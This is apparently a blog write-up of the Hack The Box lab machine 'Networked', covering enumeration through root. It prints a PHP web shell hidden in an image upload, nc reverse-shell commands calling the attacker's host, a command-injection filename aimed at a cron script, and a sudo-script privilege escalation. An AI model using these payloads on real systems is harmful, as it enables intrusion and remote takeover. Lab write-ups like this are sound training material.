## Summary

Networked just retired today. It was a pretty easy machine and I had the chance to practice my command injection skills. Its IP address is `10.10.10.146` and I added it to `/etc/hosts` as `networked.htb` to make accessing the machine easier. Without further ado, letâ€™s jump right in!

## Scanning & Web App Enumeration

A light nmap scan is all I needed to start attacking the box:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/networked# nmap -sV -O networked.htb -oN scan.txt

The index.html of the site was pretty basic:

<div>
<center><img src="/images/networked_htb_writeup/image-10.png"></center>
</div>

There was also a hidden comment on the page:

<div>
<center><img src="/images/networked_htb_writeup/image-11.png"></center>
</div>

I ran `dirb` on the page and found a directory named `backup`:

{% highlight bash %}

{% endhighlight %}

A file named `backup.tar` could be found in the directory:

<div>
<center><img src="/images/networked_htb_writeup/image-12.png"></center>
</div>

I downloaded it and started looking through the source code:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/networked# wget http://networked.htb/backup/backup.tar

root@fury-battlestation:~/htb/blog/networked#

{% endhighlight %}

## Shell as www-data

Looking through the source, I didnâ€™t find any major vulnerability that would allow me to change the uploaded file extension. However, the resulting file would keep all the extensions it has (e.g. `a.php.jpg` would be renamed `[something].php.jpg`). After re-reading the source code a few times, I tried to just append PHP code at the end of an image file and hope that the server will execute it if the filename contains `.php`:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/networked# cp ~/Pictures/yakuhito.jpg .
root@fury-battlestation:~/htb/blog/networked# echo '<?php echo shell_exec($_GET["cmd"]); ?>' >> ./yakuhito.jpg 
root@fury-battlestation:~/htb/blog/networked# cp yakuhito.jpg yakuhito.php.jpg

{% endhighlight %}

I then uploaded the file by going to `/upload.php`:

<div>
<center><img src="/images/networked_htb_writeup/image-13.png"></center>
</div>

After that, I browsed to `/photos.php`, right-licked the image I just uploaded and click on â€˜View Imageâ€™ so my browser would take me to the siteâ€™s uploads directory.

<div>
<center><img src="/images/networked_htb_writeup/image-14.png"></center>
</div>

<div>
<center><img src="/images/networked_htb_writeup/image-15.png"></center>
</div>

The server didnâ€™t interpret the file as an image. In other words, the server found `.php` in the filename and interpreted it as a PHP script. I tried to supply a simple command via the `cmd` parameter and see if I had command execution:
<center><img src="/images/networked_htb_writeup/image-16.png"></center>

The `id` command was successfully executed. Moreover, I could see the output at the end of the page. With that in mind, I used `nc` to spawn a reverse shell on port 443:

{% highlight bash %}
http://networked.htb/uploads/10_10_14_140.php.jpg?cmd=nc%2010.10.14.140%20443%20-e%20/bin/bash

{% endhighlight %}

As soon as I got the reverse shell, I spawned a tty:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/networked# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.140] from (UNKNOWN) [10.10.10.146] 51886
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ wwhhoamoamii

apache
bash-4.2$ llss

10_10_14_140.php.jpg  127_0_0_1.png  127_0_0_3.png  index.html
10_10_14_207.php.png  127_0_0_2.png  127_0_0_4.png
bash-4.2$

{% endhighlight %}

## Shell as guly

After that, I started enumerating and searching for a way to get user. The first thing I did was to see if there is another user on the machine:

{% highlight bash %}
bash-4.2$ llss  //hhoommee

guly
bash-4.2$

{% endhighlight %}

The user seemed to have a crontab file, so I checked its contents:

{% highlight bash %}
bash-4.2$ lsls  /h/ohmeo/me/gugluyly

check_attack.php  crontab.guly	user.txt
bash-4.2$ ccaatt  //hhoommee//gguullyy//ccrroonnttaabb..gguullyy

*/3 * * * * php /home/guly/check_attack.php
bash-4.2$ 

{% endhighlight %}

Basically, the following script would be ran regularly:

{% highlight php %}
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

{% endhighlight %}

Thereâ€™s a simple command injection vulnerability in that script. I used `touch ;$(nc 10.10.14.140 444 -c bash);` to create a file that would get me a reverse shell whenever the script is executed. After waiting for about three minutes, I got the shell:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/networked# nc -nvlp 444
listening on [any] 444 ...
connect to [10.10.14.140] from (UNKNOWN) [10.10.10.146] 42280
python -c "import pty; pty.spawn('/bin/bash')"
[guly@networked ~]$ wc /home/guly/user.txt
wc /home/guly/user.txt
 1  1 33 /home/guly/user.txt
[guly@networked ~]$

{% endhighlight %}

I will not post the contents of `user.txt` here, however, I will say that the proof starts with `52` ðŸ™‚

## Getting root

After getting the user proof, I started enumerating the host. While doing that, I found an interesting `/etc/sudoers` entry:

{% highlight bash %}
[guly@networked .ssh]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked .ssh]$

{% endhighlight %}

The current user can run `/usr/local/sbin/changename.sh` without providing a password. The scriptâ€™s source is pretty simple:

{% highlight bash %}
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0

{% endhighlight %}

To be honest, I discovered the method to get root through fuzzing and trying different payloads.

EDIT: [Found the explanation!](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) (source: [0xRickâ€™s blog](https://0xrick.github.io/hack-the-box/networked/))

{% highlight bash %}
[guly@networked .ssh]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
garbage /bin/bash
garbage /bin/bash
interface PROXY_METHOD:
garbage /bin/bash
garbage /bin/bash
interface BROWSER_ONLY:
garbage /bin/bash
garbage /bin/bash
interface BOOTPROTO:
garbage /bin/bash
garbage /bin/bash
[root@networked network-scripts]#

{% endhighlight %}

Note that the input is doubled because it was sent via `nc`, not because I entered it 2 times.

{% highlight bash %}
[root@networked network-scripts]# wc /root/root.txt
wc /root/root.txt
 1  1 33 /root/root.txt
[root@networked network-scripts]#

{% endhighlight %}

The root proof starts with `0a` ðŸ˜‰
